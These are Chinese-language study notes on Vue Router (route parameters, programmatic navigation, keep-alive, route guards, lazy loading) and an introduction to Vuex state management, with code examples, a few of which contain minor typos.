<router-link :to='{
  path:'/home/message/detail',
  query: {
    id: item.id,
    title: item.title
  }
}'>
```

<br>

### 示例:
```html
<template>
  <div>
    <h3>App组件</h3>
    <hr>
    <div>
      <router-link 
        to="/page1?title=sam&age=18">
        Page1
      </router-link> <br>

      <router-link to="/page2">Page2</router-link>
    </div>

    <hr>
    <router-view></router-view>
  </div>
</template>


<!-- 路由组件 -->
<template>
  <div>
    <h3 class="page_one">Page one</h3>
    <hr>
    <h3>{{content.title}} -- {{content.age}}</h3>
  </div>
</template>

<script>
export default {
  name: "Page1",
  data() {
    return {
      content: {
        title: "",
        age: ""
      }
    }
  },
  created() {
    // 从 this.$route.query 获取 参数
    let {title, age} = this.$route.query
    this.content = {title, age}

    console.log(this.content)
  }
}
</script>
```

<br><br>

# 路由传参: params形式传递

### 问题: 
刷新页面参数会丢失 刷新也没有丢失数据呀

<br>

### 传递 params 参数: 字符串写法
1. 将要传递的 数据 或 变量 使用如下形式进行拼接
```html
<!-- 
  要使用 v-bind:to 里面有变量的时候 要普通冒号 包裹 模板字符串的方式
 -->
<router-link 
  :to='`/home/message/detail/666/你好啊`'
>
```

<br>

2. 在目标组件的路由配置对象中 path 属性定义变量 声明该组件要接收什么数据
```js 
const routes = {
  [
    {
      path: 'detail/:id/:data',
      component: Home
    }
  ]
}
```


<br>

### 目标组件接收 params 参数:
该组件在获取数据的时候 从 ``this.$route.params`` 身上获取 id 和 data数据
```js
params: {id: "8"}
```

<br>

### 传递 params 参数: 对象写法
对象写法中 就不能用path 必须使用组件路由配置中的name别名
```html
<!-- 
  不能用path, 要使用name
 -->
<router-link :to='{
  name:'组件的别名',
  params: {
    id: item.id,
    title: item.title
  }
}'>
```

<br><br>

# 编程式路由导航
不借助router-link实现的跳转就是编程式的路由导航 我们通过$router身上的方法来完成逻辑 $router是new VueRouter的实例

<br>

### **<font color="#C2185B">this.$router.push(参数)</font>**  
### **<font color="#C2185B">this.$router.replace(参数)</font>**  
- 使用push模式跳转 会留下历史记录  
- 使用replace模式跳转 不会留下历史记录

<br>

**参数:** 
方式1: 配置对象
```js 
// 传递 query 参数
this.$router.push({
  path: '/home',
  query: {
    key: value
  }
})

// 传递 params 参数  注意: 跳转的时候 要使用 name 属性
this.$router.push({
  name: "page1",
  params: {
    id: 1
  }
})
```

<br>

方式2: 路径
```js 
this.$router.push('/home')
```

<br>

### **<font color="#C2185B">this.$router.back()</font>**  

<br>

### **<font color="#C2185B">this.$router.forward()</font>**  
后退和前进功能

<br>

### **<font color="#C2185B">this.$router.go()</font>**  
接收一个整数 2 连续前进二步 -2 连续后退二步

```html
<!-- 我希望通过监听这两个按钮的点击, 使用内部的处理函数来进行路由之间的跳转 App.vue --- script标签内部 -->
<button @click='homeClick'>首页</button>
<button @click='aboutClick'>关于</button>

<script>
export default {
  name: 'App',
  methods: {
    homeClick() {
      this.$router.push('/home')
    },
    aboutClick() {
      this.$router.push('/about')
    },
  }
}
</script>
```  

<br>

### 注意:
使用编程式路由导航 对象的形式传递params的时候 可能不能用path要用路由别名name

<br>

### **<font color="#C2185B">this.$router.resolve()</font>**  
用于解析路由路径并生成与之对应的路由对象, 可以将给定的路径解析为一个完整的路由对象, 包括路径、参数、查询参数等信息。

**该方法返回一个解析后的路由对象**, 您可以进一步访问它的属性, 如 route.path、route.params、route.query 等。

<br>

**参数:**  
可以直接传递 url 或者 配置对象

```js
this.$router.resolve({
  path: '/home',
  query: {
    key: value
  }
})


// 传入 /test/test1 
const _route = this.$router.resolve(this.$route.path)
console.log(_route)
```

**返回值:**   
路由对象

```js
{
  //  uri部分 我们可以利用它 进行新窗口打开
  href: "/test/test1"

  // 解析后的路由信息对象, 包含路径、参数、查询参数等信息。
  location: 
    hash: ""
    params: {}
    path: "/page1"
    query: {}
    _normalized: true

  // 标准化后的路由信息对象, 与 location 属性相同
  normalizedTo: 
    hash: ""
    params: {}
    path: "/page1"
    query: {}
    _normalized: true

  // 解析后的完整路由信息对象, 包含完整路径、匹配的路由记录、元信息等
  resolved: 
    fullPath: "/page1"
    hash: ""
    matched: [{…}]  // 路由数组
    meta: {}
    name: undefined
    params: {}
    path: "/page1"
    query: {}

  // 与 resolved 属性相同, 用于保持一致性, 可忽略
  route: 
    fullPath: "/page1"
    hash: ""
    matched: [{…}]
    meta: {}
    name: undefined
    params: {}
    path: "/page1"
    query: {}
}
```

<br>

**注意:**
如果没有传入的路径没有匹配的组件 那么 matched[] 数组的长度为0

<br>

### 使用场景:
**动态生成路由链接:**   
您可以使用 this.$router.resolve() 方法根据特定的参数动态生成路由链接, 然后将其用于导航或生成URL。
```html
<template>
  <div>
    <router-link :to="generateProductLink(123)">Product 123</router-link>
  </div>
</template>

<script>
export default {
  methods: {
    generateProductLink(productId) {
      const resolvedRoute = this.$router.resolve({
        name: 'product',
        params: { id: productId }
      });
      return resolvedRoute.href;
    }
  }
};
</script>

```

<br>

**路由验证:**   
您可以使用 this.$router.resolve() 方法来验证某个路径是否存在于路由配置中, 或者判断特定参数是否匹配某个路由。

```js
// 在路由守卫中进行路由验证
router.beforeEach((to, from, next) => {
  const resolvedRoute = router.resolve(to.path);

  // 并检查 resolvedRoute.matched.length 是否大于0来判断路由是否存在。
  if (resolvedRoute.matched.length > 0) {
    // 路由存在, 进行验证逻辑
    if (/* 验证通过 */) {
      next(); // 验证通过, 继续导航
    } else {
      next('/unauthorized'); // 验证未通过, 导航到未授权页面
    }
  } else {
    next('/not-found'); // 路由不存在, 导航到404页面
  }
});

```

<br>

**前置处理:**  
您可以在路由导航之前使用 this.$router.resolve() 方法获取解析后的路由信息, 并根据需要进行一些前置处理或决策。

总之, this.$router.resolve() 方法提供了一种动态解析和处理路由的能力, 您可以根据实际需求使用它来生成链接、验证路由或进行前置处理。

```js
// 在路由导航之前进行前置处理
router.beforeEach((to, from, next) => {
  const resolvedRoute = router.resolve(to.path);
  if (to.name === 'checkout') {
    // 进行前置处理逻辑
    if (/* 前置处理通过 */) {
      next(); // 前置处理通过, 继续导航到结算页面
    } else {
      next(resolvedRoute.href); // 前置处理未通过, 导航到当前页面
    }
  } else {
    next(); // 不需要前置处理的路由, 直接继续导航
  }
});

```

<br><br>

## 动态路由

### **<font color="#C2185B">this.$router.addRoutes(routes)</font>**  
``this.$router.addRoute()`` 已弃用, 需要使用 addRoute() 来代替

**作用:**  
动态的添加更多的路由规则 参数必须是一个 符合 routes 选项要求的数组

```js
const dynamicRoutes = [
  {
    path: '/dynamic',
    component: DynamicComponent
  },
  {
    path: '/dynamic2',
    component: DynamicComponent2
  }
];

this.$router.addRoutes(dynamicRoutes);
```

<br>

**<font color="#C2185B">this.$router.addRoute(parentPath, route)</font>**  
动态添加单个路由配置到指定的父级路由

添加一条新路由规则 如果该路由规则有 name 并且已经存在一个与之相同的 则会覆盖

<br>

```js
const newRoute = {
  path: '/new',
  component: NewComponent
};

this.$router.addRoute('parent', newRoute);

```

<br>

**<font color="#C2185B">this.$router.getRoutes()</font>**  
获取所有活跃的路由记录列表

```js
const routes = this.$router.getRoutes();
console.log(routes);
```

<br>

**<font color="#C2185B">this.$router.onError(cb)</font>**  
注册一个回调 该回调会在路由导航中出错的时候被调用 注意被调用的错误必须是下列情形中的一种

- 错误在一个路由守卫函数中被同步抛出
- 错误在一个路由守卫函数中通过 调用 next(err) 的方式异步捕获并处理
- 渲染一个路由的过程中 需要尝试解析一个异步组件时发生的错误

<br><br>

# 缓存路由组件 ``<keep-alive>``

### 作用: 
让不展示的路由组件保持挂载 不被销毁

<br>

### 场景:
有这么一个场景 一个注册页面 我们填写完了很多的信息 然后点击按钮切换到了别的页面 这时候我们再回来发现我们写的信息都没有了

因为跳转到另一个页面 前一个组件就会被销毁 我们回退回去之后它属于重新生成里面的内容就是生成的新的 没办法diff算法 没办法复用 只能用新的节点替换掉旧的节点

那怎么才能保存之前我们浏览的状态呢? 

<br>

### ``<keep-alive>``组件
是vue内置的一个组件, 可以使被包含的组件保留状态, 或避免重新渲染和重新创建 放在里面的组件会被缓存

```html
<keep-alive>
  <router-view></router-view> 
</keep-alive>
```

放在 keep-alive 里面的状态都会被保存 也就是显示在里面的组件不会被销毁 

但是也不是所有的组件被缓存就是好的 我们可以针对那些需要被缓存的项目进行缓存 比如 input

<br>

### ``<keep-alive>``缓存后才有的生命周期

<br>

### **<font color="#C2185B">activated() { ... }</font>**  
当页面处于活跃状态的时候, 执行该回调

<br>

### **<font color="#C2185B">deactivated() { ... }</font>**  
当页面不处于活跃状态的时候, 执行该回调

<br>

### 实际场景:
有一个群友说 一个B页面中的结构只想展现一次

<br>

### 思路1:
通过定义一个变量 然后通过v-if来决定该结构是否被渲染

<br>

### 问题:
什么时候修改这个变量的值
1. 组件销毁
2. 路由守卫

上述两点都不行 因为离开当前页面确实是组件销毁了 但是回来后会被重新创建 即使销毁的时候我们修改了flag的值 重新创建的时候也会赋值回来

<br>

### 解决方法:
```
<keep-alive> + deactivated() { ... }
```

```html 
<div id="app">
  <div>
    <h3>我是app页面</h3>
  </div>
  <hr>
  <div class="nav">
    <router-link to="/home">Home</router-link> <br>
    <router-link to="/login">Login</router-link> <br>
  </div>
  <div class="view">
    <keep-alive>
      <router-view />
    </keep-alive>
  </div>
</div>

<script>
data() {
  return {
    flag: true
  }
},

// 当该组件失活的时候 修改flag
deactivated() {
  this.flag = false
  console.log(this.flag)
}
</script>
```

<br>

### ``<keep-alive include='字符串 or 正则 or 数组'>``
字符串或正则表达, 只有匹配的组件会被缓存 如果有多个组件需要用 号隔开

想缓存啥就写啥

<br>

### ``<keep-alive exclude='字符串 or 正则 or 数组'>``
字符串或正则表达, 任何匹配的组件都不会被缓存 **当有多个组件要被缓存的时候 还可以传递数组**

不想缓存啥就写啥

```html
<keep-alive :exclude='["News", "About"]'>
```

<br>

**注意:**  
exclude='不要随意加空格', 正则里面也不要有空格
```html
<!-- 这是对的 -->
<keep-alive exclude='Profile,User'>
  
<!-- 这是错的 -->
<keep-alive exclude='Profile, User'>
```

exclude='这里面的name是' 是组件名

<br>

### ``<keep-alive :max="10">``
指定缓存组件的数量 比如我们有11个组件 只缓存10个 那么它内部会有一个算法 将不常用的组件舍弃掉

<br>

### 问题: 
当遇到嵌套路由的时候,可能并没有起到我们想要的效果(不重新创建组件渲染页面)

<br>

### 尝试方案1:
我们的嵌套路由是通过在路由里面添加 children:[] 属性传递的 里面有一个 redirect 属性 是用来做刷新页面时 显示默认页面的
```js 
{
  path: '/home',
  component: Home,

  meta: {
    title: '首页'
  },
  
  children: [
    {            --------------------------
      path: '',
      redirect: 'news'    我们把这个部分禁掉
    },          ---------------------------
    {
      path: 'news',
      component: HomeNews,
    },
    {
      path: 'message',
      component: HomeMessage,
    }
  ]
},
```

禁掉 redirect 就意味着 每次我们进入home页面的时候需要手动点击 新闻 或者 消息的链接才会有内容, 为了解决这个问题 我们可以这样

在Home.vue文件里, 使用 created() {} 声明周期函数 当创建该组件的时候 修改链接的地址
```js 
export default {
  name: 'Home',

  // 创建时候的生命周期函数
  created() {
    console.log('created');

    // 通过push方法 在该组件被创建的时候 修改地址
    this.$router.push('/home/news');
  },

  // 销毁时候的生命周期函数
  destroyed() {
    console.log('destroyed')
  }
}
```

在 created() {} 生命周期函数中 使用 this.$router.push('/home/news'); 方式

但是上述方法不行, 本来这里是为了解决, 禁掉 redirect属性后 刷新页面有默认显示页面的 

但是失败了, 第一次刷新后是有默认页面但是点击别的页面后再回到该页面 并没有显示默认页面

<br>

### 尝试方案2
我们尝试了第二种解决方式 在该组件中声明一个默认路径
```js 
  data() {
    return {
      // 为了解决 禁掉 redirect属性后 刷新页面没有默认显示的问题, 我们定义了一个默认路径
      path: '/home/news'
    }
  },
```

然后使用 created() { ... } 生命周期函数, 在创建该组件时, 将路径修改为 /home/news
```js 
  created() {
    console.log(this.path);

    // 本来这里是为了解决, 禁掉 redirect属性后 刷新页面有默认显示页面的 但是失败了, 第一次刷新后是有默认页面但是点击别的页面后再回到该页面 并没有显示默认页面
    this.$router.push('/home/news');
  },
```

上述方法也失败了 第一次刷新后是有默认页面但是点击别的页面后再回到该页面 并没有显示默认页面

<br>

### 尝试方案3
该方式只能在 router-view 被 keep-alive 包裹起来之后使用 使用 activated() { ... } 当该组件处于活跃状态的时候, 修改路径

使用 beforeRouteLeave(to, from .next) { ... }  
要离开该组件的时候, 把路径保存起来, 为的就是记录离开时的状态
```js 
activated() {
  // 当该组件处于活跃状态的时候, 修改路径
  this.$router.push(this.path);
},

// 我们使用在组件内的导航守卫 
beforeRouteLeave(to, from, next) {
  // 为了记录上一次离开时候的状态 我们使用了这个组件内的导航守卫 
  // 离开该组件的时候 要把离开的组件路径记住, 然后把这个路径保存给this.path 就是为了记录上一次离开时的状态
  // 导航离开该组件的对应路由时调用

  console.log(this.$route.path);
  this.path = this.$route.path;
  next();
}
```

<br><br>

# 补充生命周期:
以前我们在mounted函数里面开启定时器 在组件即将被销毁的函数里面关闭定时器  

但是有一个问题 路由组件在切换的时候 有的时候不会关闭定时器 比如嵌套的结构
所以我们可以利用下面的两个路由组件的生命周期函数

<br>


### **<font color='#C2185B'>activated() { }</font>**
处于活跃状态的时候执行该回调 激活 (组件出现在你面前) 在这个函数中开启定时器

<br>

### **<font color='#C2185B'>deactivated() { }</font>**
不处于活跃状态的时候执行该回调 失活 (组件消失在你面前) 在这个函数中关闭定时器

<br>

### **<font color='#C2185B'>nextTick(function() { })</font>**
这个不是路由组件的生命周期  

当修改了数据之后 vue帮我们操作完dom之后 把真实的dom放在页面了 就会调用这个函数

<br>

**nextTick原理:**
- 异步说明: Vue 实现响应式并不是数据发生变化之后 DOM 立即变化 而是按一定的策略进行 DOM 的更新

- 事件循环说明: 简单来说 Vue 在修改数据后 视图不会立刻更新 而是等同一事件循环中的所有数据变化完成之后 再统一进行视图更新。

- created、mounted: 在 created 和 mounted 阶段 如果需要操作渲染后的试图 也要使用 nextTick 方法。  

注意 mounted 不会承诺所有的子组件也都一起被挂载。如果你希望等到整个视图都渲染完毕 可以用 vm.$nextTick 替换掉 mounted

<br><br>

# 路由守卫
古代有御前侍卫 是保护君王的安全 路由守卫就是保护路由的安全(权限) 我想让你看什么 或者 不想让你看什么

- 比如有些导航按钮 我们需要在满足一些条件之后才能点的时候 
- 比如用户的个人中心 我们是不是需要验证看看是否登录

<br>

### 权限管理示例:
``` 
Home      这个随便点
About      这个随便点

  News      只有学校是尚硅谷 才能点
  Message   只有学校是尚硅谷 才能点
```

我们把学校存在localStorage里面 ``school: atguigu``

也就是说 我们在点击 News Message 的时候我们需要校验一下 看看学校是不是atguigu 如果是 再呈现给用户

<br>

### 鉴权:
1. 首先把权限数据放入一个公共的位置 比如 
```
vuex localStorage meta
```

2. 然后点击按钮的时候 我们需要校验下权限

<br>

### 点击路由按钮后的流程
```
用户点击导航区  ---  
    引起了路径的改变  ---  
        前端路由器监测到然后进行规则的匹配  ---  
            在合适的位置呈现组件
```

<br>

我们在上述的哪一个环节中加入校验最为合适  --- **前端路由器监测到然后进行规则的匹配** 这个环节

<br>

我们跟路由器说 假如以后有人访问的是 /home/news 你能去localStorage里面的 school看看值是不是atguigu
- 如果是 你就正常的呈现组件 
- 如果不是 你就不要呈现组件

<br>

我们要在router的配置文件中进行配置守卫 回到router文件夹下的index.js文件 **在暴露路由对象前 我们添加路由守卫**
```js 
const router = new VueRouter({
  routes: [
    {
      name: 'shouye'      // 路由的别名
      path: '/home',
      component: Home
    }
  ]
})

router.beforeEach((to, from, next) => {})

// 最后暴露
export default router
```

<br>

### 全局前置路由守卫:
### **<font color="#C2185B">router.beforeEach((to, from, next) => {})</font>**  
在每一次路由切换之前 都会调用这个函数 初始化的时候也会被调用

<br>

**参数:**   
**<font color="#C2185B">to</font>**   
你要去哪 它是一个对象 要跳过去目标的路由信息

里面有 hash query params name meta matched等属性或对象 就是目标的route

<br>

**<font color="#C2185B">from</font>**   
你从哪里来 它是一个对象 **目前所处位置的路由信息**

<br>

**<font color="#C2185B">next()</font>**   
用于放行 该流程才能继续走下去

<br>

**形式1: 不传**    
表示放行

<br>

**形式2: false**  
中断当前的导航 如果浏览器的url发生变化 那么会重置到 from 路由对应的地址

<br>

**形式3: 路径**  
跳转到一个指定的接口

<br>

**形式4: 对象**   
该对象就是 push() router-link to 绑定的传参对象
```js
next({
  path: "/"
})
```

<br>

**形式5: error**  
如果传入 next 的参数是一个 Error 实例, 则导航会被终止且该错误会被传递给 router.onError() 注册过的回调。

<br>

### 应用场景: 权限
怎么应用 全局前置路由守卫呢?

我们可以判断一下什么时候放行 什么时候不放行
```js 
// 比如 学校名是atguigu就放行 或者我们已经拿到了要去哪个路由 我们可以根据to身上path判断也可以

router.beforeEach((to, from, next) => {
  if(localStorage.getItem('school') === 'atguigu') {
    next()
  }
}) 


// 如果是多个路由都要进行判断怎么办?  再包一层if
router.beforeEach((to, from, next) => {
  if(to.path === '/home/news' || to.path === '/home/message') {

    if(localStorage.getItem('school') === 'atguigu') {
      next()
    }

  // 上面是当是那两种情况我们加上限制 如果不是那两种情况我们就要放行
  } else {    
    next()
  }
}) 
```

<br>

上面有一个地方不太好 就是我们对某一些按钮进行限制的时候要对它们进行判断 但假如有12个按钮 难道我们要在这里写12个条件么? 
```js 
if(to.path === '/home/news' || to.path === '/home/message')
```

<br>

### 怎么解决这个问题呢?   
就是给每一个路由配置里面添加一个特殊的属性 用于标识着本路由是否需要进行权限的校验

我们在路由配置规则(routes)里面加上这个属性后 to 和 from都能看到 我就可以直接验证 to.peiqi 这个属性是不是true 就需要进判断 如果是false那就是不需要进行权限的校验

路由组件身上有什么信息 我们可以输出 this.$route 那这个特殊的属性 加在 路由配置对象的哪里呢?  **meta**

<br>

### 扩展: routes配置项: meta 路由元信息
它是routes中的一个配置想 值是对象类型

<br>

**作用:**   
在meta中我们可以放一些 程序员自定义的信息

我们想放的特殊的数据 router免费给我们提供的一个容器可以随意往里放东西

<br>

结合上面的例子 我们可以在meta中放置一个特殊的标识属性 代表是否授权 isAuth  

谁需要权限的校验meta配置项就放在对应的路由规则里面 ``isAuth: true`` 就代表该路由需要权限的校验  

<br>

路由组件身上有什么信息 我们可以输出 this.$route 

<br>

### 技巧: 
不用每一个路由规则里面都写 isAuth: true 或者 isAuth: false 不写的路由规则里 没有就是undefined 就是false呗
```js 
routes: [
  {
    name: 'guanyu',
    path: '/about',
    component: About,

    // 我们在meta中输入些 自定义的数据 isAuth 用于标识该路由是否需要进行权限的验证
    meta: {
      isAuth: true
    }
  }
]

router.beforeEach((to, from, next) => {

  // 判断是否需要鉴定权限
  if(to.meta.isAuth) {

    if(localStorage.getItem('school') === 'atguigu') {
      next()
    }

  } else {
    next()
  }
}) 
```

<br>

### 后置路由守卫
### **<font color="#C2185B">router.afterEach((to, from) => {})</font>**  
该函数会在初始化的时候 和 每次路由切换之后被调用 切换已经切完了 后置路由守卫没有next 因为来都来了

to from也是路由信息

<br>

**应用场景:** 
我们每切换一次路由的时候 页签的title可以跟着变化

```js 
// js里可以使用 document.title 比如我们可以在 meta 当中给每一个路由规则里面都配置一个title
meta: { title: '关于' }

router.afterEach((to, from) => {
  document.title = to.meta.title || '硅谷系统'
})
```

<br>

### 独享路由守卫:
一个路由单独想用的路由守卫  

比如我们一个项目里面有很多的路由 但是我只想用路由守卫对一个路由进行限制

比如我们的组件有首页 关于 新闻 消息 等 我们现在只想对 关于页面进行权限监测 那么就可以在这个关于的页面里面 配置 一个路由守卫

我们在一个路由规则里面配置 独享路由守卫
```js 
  routes: [
    {
      name: 'guanyu',
      path: '/about',
      component: About,

      beforEnter: (to, from, next) => { ... }
    }
  ]
```

<br>

### **<font color="#C2185B">beforEnter: (to, from, next) => { }</font>**  
在某一个路由的配置项里面进行配置 如上 某一个路由独享的守卫

<br>

**注意: 独享路由守卫只有前置没有后置**

<br>

### 组件内的路由守卫:
也就是在组件里面写路由守卫 而不是在路由的配置文件里面写 都写在组件内的配置项里面 和 methods等 同级

<br>

**要点1:**  
组件内的路由守卫中 没有this  

因为在执行路由钩子函数beforRouteEnter时候, 组件还没有被创建出来 先执行beforRouteEnter, 再执行组件周期钩子函数beforeCreate。

<br>

**要点2:**  
next()的参数是回调, 回调的参数是vm, 它是组件的实例化对象, 就是组件本身

<br>

**要点3:**  
必须调用 next()

<br>

### **<font color="#C2185B">配置项: beforeRouteEnter(to, from, next) { ... }</font>**  
'通过路由规则进入' 该组件时被调用 **进入之前会调用**  
比如我们直接写组件标签 渲染出来的组件就不会调用这个函数

<br>

### **<font color="#C2185B">配置项: beforeRouteLeave(to, from, next) { ... }</font>**  
'通过路由规则离开' 该组件时被调用 走之前会调用

<br>

**应用场景:**  
比如判断权限 只是对这个组件起作用

<br>

**注意:**
只有全局路由守卫分前置和后置 前置是进入前

<br><br>

## 扩展: 路由守卫 和 生命周期的执行顺序
```js
// beforeRouteEnter(路由独享的前置守卫): 在路由进入前被调用, 此时组件实例尚未被创建, 因此无法访问组件实例的属性和方法

// beforeResolve(解析守卫 ): 在所有异步路由组件被解析之后调用。

// afterEnter(路由独享的后置守卫): 貌似笔记上说没有该守卫

beforeEach -> beforeEnter -> beforeRouteEnter -> created -> beforeMount -> mounted -> beforeResolve -> afterEnter -> beforeRouteUpdate -> updated -> afterEach -> beforeRouteLeave
```

路由守卫和组件生命周期钩子函数是独立的, 它们的执行顺序是根据路由切换和组件的生命周期阶段来决定的。

在特定的情况下, 可以通过路由守卫来触发组件的方法或操作组件的状态, 以满足特定的需求。


<br><br>

# 路由的懒加载
当打包构建应用时, js包会变得非常大, 影响页面的加载  

如果我们能把不同路由对应的组件分割成不同的代码块, 然后当路由被访问的时候才加载对应的组件, 这样就更加高效的

之前我们自己配置webpack打包的时候 我们打包的时候会打包入口js文件, 这样所有的东西都打包在这个入口js文件里后, 这个js文件就会变得非常的大

这样当我们去静态资源服务器里第一次请求资源的时候, 就要花费过长的时间因为js文件太大了, 所以在请求的过程当中浏览器会出现短暂的空白的  

而且 我们自己使用webpack配置打包的时候, 并没有把css文件单独做抽离, 相当于是在js文件里面包含的

而脚手架配置的时候, 就发现了这个问题, 对我们的js文件和css文件进行了分包 脚手架配置的webpack会对css文件做分离处理

<br>

### 脚手架打包后的目录结构:
```s
| - dist
  | - static
    | - css
      # .css文件  该项目所有的css相关文件 打包到这里

    | - js
      appxxxx.js
      # 当前应用程序开发的代码都在这里面 自己写的业务代码都在这里

      manifestxxx.js
      # 为我们打包的代码最低层支撑的, 我们在项目开发的时候用了很多的模块化导入导出, 在项目开发里面既可以用es6导出 也可以用commonjs 但是根本就不支持commonjs 为了让它有效能让浏览器识别 这样的代码都放在这里了

      vendorxx.js   
      # 在项目里引用的第三方的东西(比如vue vue-router axios) 只要是第三方的东西vue在打包的时候都会打包在这里
```

<br>

上面我们大致了解了vue在给项目打包的时候会把js 和 css文件进行分别处理, 所有css相关的文件会放到css文件里

js文件也会按照, 第三方框架 -- 底层支撑 -- 业务逻辑 分成这三个js文件, 当我们的项目慢慢做大的时候, 业务逻辑代码量也会相应的增加, 就会造成一个问题, 我们用户在第一次向静态服务器请求资源的时候, 由于加载的js文件大而且过多, 页面会出现短暂的空白

所以我们在真是开发中, 通常会选择一个路由打包成一个js文件, 默认的情况下并不会跟整个资源一起请求过来

比如用户点开界面展示的是首页, 那就把首页对应的js文件请求过来就可以了, 至于其他的模块先放到服务器里, 我现阶段值请求了一个

<br>

### 如何避免这种情况呢?
使用路由的懒加载, 将不同的理由对应的组件打包到不同的js文件里面

<br>

### 路由懒加载做了什么?
路由懒加载的主要作用就是将理由对应的组件打包成一个个的js代码块 **只有在这个理由被访问到的时候, 才加载对应的组件**

<br><br>

## 懒加载的方式
### 方式一: 异步组件 (不推荐)
```js 
const Home = resolve => {
  require.ensure(['../components/Home.vue'], () => {
    resolve(require('../'components/Home.vue'))
  })
}
```

<br>

### 方式二: AMD写法
```js
const About = resolve => require(['../components/Home.vue'], resolve);
```

<br>

### 方式三: import函数 (推荐)
在es6中, 我们可以有更加简单的写法来组织vue异步组件和webpack的代码分割
```js
const Home = () => import('../components/Home.vue')
```

<br>

### 总结:
实现路由懒加载就是把以前普通的导入方式 修改为 通过函数调用的方式 一个懒加载会对应一个js文件

```js 
// 把上面的形式修改为路由懒加载
const Home = () => import('../components/home')
const About = () => import('../components/about')
const User = () => import('../components/User')


// 再在下面时候 Home About User
const routes = [
  {
    path: '/',
    redirect: '/home'
  },

  {
    path: '/home',
    component: Home
  },
  {
    path: '/about',
    component: About
  },
  {
    path: '/user/:userId',
    component: User
  }
]
```

<br><br>



<br><br>

# Vuex
### 概念: 
Vuex是专门在vue中实现集中式状态(数据)管理的一个vue插件 对vue应用中多个组件的共享状态进行集中式的管理(读/写) 也是一种组件间通信的方式 且适用于任意组件间通信

<br>

**注意:**  
它是一个插件哦 Vue.use(Vuex) 响应式的, **管家内部的变量被改变的时候 界面自动刷新**

<br>

### 什么时候使用vuex
多个组件依赖于同一状态(数据)  

不同组件的行为需要变更同一状态(也就是别的组件的操作都会修改vux中的数据) 也就是共享

<br>

### 状态管理到底是什么?
状态管理模式

集中式存储管理这些名词听起来就非常高大上, 让人捉摸不透, 其实 可以简单的将其看成, 把需要多个组件共享的变量全部存储在一个对象里面

然后将这个对象放在顶层的Vue实例中 让其他组件可以使用, 那么多个组件是不是就可以共享这个对象中的所有变量属性了呢?

而且所有组件可以读取vuex中的数据 同时所有组件也可以修改vuex中的数据 其它组件看到的是数据被修改后的值

我们可以把上述中说到的状态, 理解为一个变量 现在我们要用这个变量存储这个状态 这个状态就是数据

当很多个组件都想用到这个状态的时候 组件是一个树结构, 将状态放在哪个组件里都不合适, 因为底层C组件想用顶层A组件的状态时, 需要从顶层层层传递到底层组件

我们可以 new一个专门的对象, 我们把new出来的这个对象当做是一个管家 这个管家帮我们管理这个状态

```s   
# 所有组件的状态都交给管家来管理就是集中式 这个数值需要共享, 我们就在公共的部分创建这个对象

            对象 (管家)
             count:0  

组件A         组件B         组件C
```

<br>

### Vuex帮我们管理的常用状态
我们所说的状态, 这个状态会在多个界面间共享的问题 比如 

- 用户的登录状态(token)
- 用户名称
- 头像
- 地理位置信息
- 商品的收藏
- 购物车中的物品等等

这些状态信息, 我们都可以放在同一的地方, 对它进行保存和管理, 而且它们还是响应式的

<br><br>

# Vuex: 单界面的状态管理
在单个组件中进行状态管理是一件非常简单的事情

<br>

### 单组件中的 数据 行为 页面 之间的关系
```
      在单界面中有3个角色

         Actions

      ↗         ↘

  View      ←        State
```

<br>

### State:
用于存储当前这个界面或者这个组件里面的状态(数据)  

前面说了我们是通过变量来保存状态 而单个组件中的变量一般保存在data配置项中
```js
data() {return {数据}} 
```

<br>

所以对于我们单个组件来说, State相当于我们的data 如果data里面定义多个变量 就相当于保存了多个状态 而data中的状态是放在View里面显示的 

<br>

### View
View里面引用了也data中的状态 通过``{{}}``显示在页面中做了展示 而View里面又产生了一些行为(Actions) 比如用户发生了点击

<br>

### Actions
一旦发生了Actions的时候 会返回来修改State中的状态  

<br><br>

# Vuex的使用:
vuex是插件, 所以我们还是要先下载

<br>

### 1. 安装Vuex
```s
npm i vuex --save
```

<br>

### 2. 创建 store/index.js 
1. 引入 Vue, 目的使用 use() 注册插件
```s
import Vue from 'vue'
```

2. 引入 Vuex
```s
import Vuex from 'vuex'
```

3. 注册 Vuex
```s
Vue.use(Vuex)

# 当我们Vue.use(Vuex)后 全局就多了一个 $store对象 可以通过该对象拿到 Vuex中的数据  
```

4. 创建store对象 配置 并 导出
```js
const store = new Vuex.Store({})
export default store
```

**示例:**
```js 
// store文件夹中的 index.js 文件 该文件用于创建Vuex中最为核心的store
import Vuex from 'vuex'
import Vue from 'vue'

// 我们必须跟store的文件一起 注册vuex
Vue.use(Vuex)

// 准备actions:  用于响应组件中的动作
const actions = {}

// 准备mutations:  用于操作数据(state)
const mutations = {}

// 准备state:  存储数据
const state = {}


// 创建store
const store = new Vuex.Store({
  actions,
  mutations,
  state
})

export default store
```

<br>

### 3. 入口文件中引入 store 对象, 挂载到Vue实例上
```js
import store from './store'

new Vue({
  el: '#app',
  router,
  vuetify: new Vuetify(opts),
  store,
  i18n,
  render: h => h(App)
})



import store from "./store/index"
let app = createApp(App)
let pinia = createPinia()
app.use(pinia)
app.use(ElementPlus)
app.use(store)
app.use(router)
app.mount("#app")
```

<br>

### 组件内获取 state 中的数据
### **<font color="#C2185B">$store.state.counter</font>**  
创建完store对象后 就会有 $store 对象 我们可以通过this.$store的方式获取 **注意模板中可以不用写this**

其它组件可以通过 $store 对象获取 仓库中的公共变量

<br>

### Vuex: 配置对象
固定的5个
```js 
const store = new Vuex.Store({

  // 1. 
  state: { },

  // 2.
  mutations: { },

  // 3.
  actions: { },

  // 4.
  getters: { },

  //5.
  modules: { }
})
```

<br><br>

# Vuex: 多界面状态管理
上面的代码中 我们简单实用vuex来存储了一个可以让多个组件之间共享的变量 couter

我们把这个counter装在了store中的state对象中, 这个多个组件之间都可以使用 ``$store.state.counter`` 访问到这个变量

就是vuex提供给我们访问公共变量的格式 上面说的是访问 修改也是一样的 下面会说下 当修改的时候 我们应该怎么操作

<br>

### 简单的说下什么是多界面状态管理
Vue已经帮我们做好了单个界面的状态管理, 但是如果是多个界面呢?

多个视图都依赖同一个状态(一个状态改了, 多个界面需要进行更新)  不同界面的Actions都想修改同一个状态(Home.vue需要修改, Profile.vue也要修改这个状态)

也就是说对于某些状态(状态1, 状态2, 状态3)来说只属于我们某一个视图, 但是也有一些状态(状态a, 状态b, 状态c)属于多个视图共同想要维护的

- 状态1, 状态2, 状态3 你放在自己的房间中, 你自己管理自己用 没问题  
- 状态a, 状态b, 状态c 我们希望交给一个大管家来统一帮助我们管理

**Vuex就是为我们提供这个大管家的工具**

<br>

